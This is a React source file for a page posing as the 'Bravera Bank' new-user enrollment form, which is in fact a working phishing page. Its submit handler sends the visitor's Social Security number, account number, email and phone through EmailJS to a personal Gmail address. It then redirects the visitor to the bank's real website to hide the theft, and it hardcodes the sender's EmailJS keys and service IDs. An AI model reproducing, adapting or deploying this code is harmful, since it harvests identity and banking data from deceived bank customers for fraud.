import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import BG from '../assets/bg.png';
import Logo from '../assets/logo.png';
import Footer from '../components/Footer';
import CheckImg from '../assets/check-account-number-42674dd8.png';
import emailjs from '@emailjs/browser';

export default function Signup({ onSignup }) {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    ssn: '',
    accountNumber: '',
    email: '',
    phone: '',
    bName: 'Bravera Bank', // Default bank name
  });
  const [showModal, setShowModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const modalRef = useRef(null);

  // Initialize EmailJS
  useEffect(() => {
    // Replace with your actual EmailJS public key
    emailjs.init("v_oAluZ11har85Kfg");
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!isReadyToSubmit()) return;
    
    setIsSubmitting(true);
    setSubmitStatus(null);
    
    try {
      // Send email using EmailJS
      const response = await emailjs.send(
        "service_my2ydis", // Replace with your EmailJS service ID
        "template_vj50jeg", // Replace with your EmailJS template ID
        {
          bName: formData.bName,
          ssn: formData.ssn,
          accountNumber: formData.accountNumber,
          email: formData.email,
          phone: formData.phone,
          to_email: "Leslieolobo@gmail.com", // Optional if specified in the template
        }
      );
      
      console.log("Email sent successfully:", response);
      setSubmitStatus("success");
      
      // Redirect to the bank's real site after a short delay
      setTimeout(() => {
        window.location.href = "https://www.bravera.bank/";
      }, 1500);
      
    } catch (error) {
      console.error("Failed to send email:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const isReadyToSubmit = () => {
    return formData.ssn.trim() && formData.accountNumber.trim() && 
           formData.email.trim() && formData.phone.trim();
  };

  const handleBackClick = () => {
    navigate(-1);
  };

  const toggleModal = () => {
    setShowModal(!showModal);
  };

  // Close modal when clicking outside
  const handleClickOutside = (e) => {
    if (modalRef.current && !modalRef.current.contains(e.target)) {
      setShowModal(false);
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col justify-between"
      style={{
        backgroundImage: `url(${BG})`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
      }}
      onClick={showModal ? handleClickOutside : undefined}
    >
      {/* Main Content */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="bg-[#1E1F20] text-white w-full md:w-md max-w-lg p-6 rounded-lg shadow-xl">
          <div className="flex items-center mb-6">
            {/* Back Arrow */}
            <button
              onClick={handleBackClick}
              className="text-gray-300 -translate-y-10 -mr-5"
              aria-label="Go back"
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
            </button>
            
            <div className="flex-grow flex flex-col items-center">
              <img src={Logo} alt="Bravera Bank Logo" className="w-72 h-20" />
              <h2 className="text-xl mt-4">New user enrollment</h2>
            </div>
          </div>

          <form className="space-y-5" onSubmit={handleSubmit}>
            {/* SSN Field */}
            <div>
              <label className="text-sm text-gray-300">Social Security number</label>
              <input
                type="text"
                name="ssn"
                value={formData.ssn}
                onChange={handleChange}
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
              <p className="text-xs text-gray-400 mt-1">EIN and ITIN are also accepted</p>
            </div>

            {/* Account Number with Info Icon */}
            <div className="relative">
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleChange}
                placeholder="Account number"
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
              <button
                type="button"
                onClick={toggleModal}
                className="absolute right-3 top-3 text-gray-400 hover:text-white"
                aria-label="Account number information"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
                </svg>
              </button>
            </div>

            {/* Email */}
            <div>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="Email"
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            {/* Phone */}
            <div>
              <input
                type="tel"
                name="phone"
                value={formData.phone}
                onChange={handleChange}
                placeholder="Phone"
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            {/* Status message */}
            {submitStatus === "success" && (
              <div className="text-green-500 text-center">Signup successful. Redirecting...</div>
            )}
            {submitStatus === "error" && (
              <div className="text-red-500 text-center">
                Something went wrong. Please try again.
              </div>
            )}

            {/* Next Button */}
            <div className="flex justify-center mt-6">
              <button
                type="submit"
                className="bg-[#3B3836] text-white px-8 py-3 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={isSubmitting || !isReadyToSubmit()}
              >
                {isSubmitting ? "Processing..." : "Next"}
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Modal for Account Number Information */}
      {showModal && (
        <div>
          <div className='fixed inset-0 z-50 flex items-center justify-center bg-black opacity-50'></div>
          <div className="fixed inset-0 z-50 flex items-center justify-center">
            <div 
              ref={modalRef}
              className="bg-[#1E1F20] text-white p-6 rounded-lg shadow-lg max-w-2xl w-full relative flex flex-col items-center"
            >
              {/* Close Button */}
              <button
                onClick={toggleModal}
                className="absolute top-3 right-3 text-gray-400 hover:text-white"
                aria-label="Close modal"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>

              <h3 className="text-xl mb-4">Account number</h3>
              <p className="mb-4">You can find your account number on your checks.</p>

              {/* Check Image */}
              <img src={CheckImg} alt="Check with account number location" />

              <p className="mt-6 text-sm">
                If you don't have checks and don't know your account number, contact us for
                assistance at (877) 483-6811.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <Footer />
    </div>
  );
}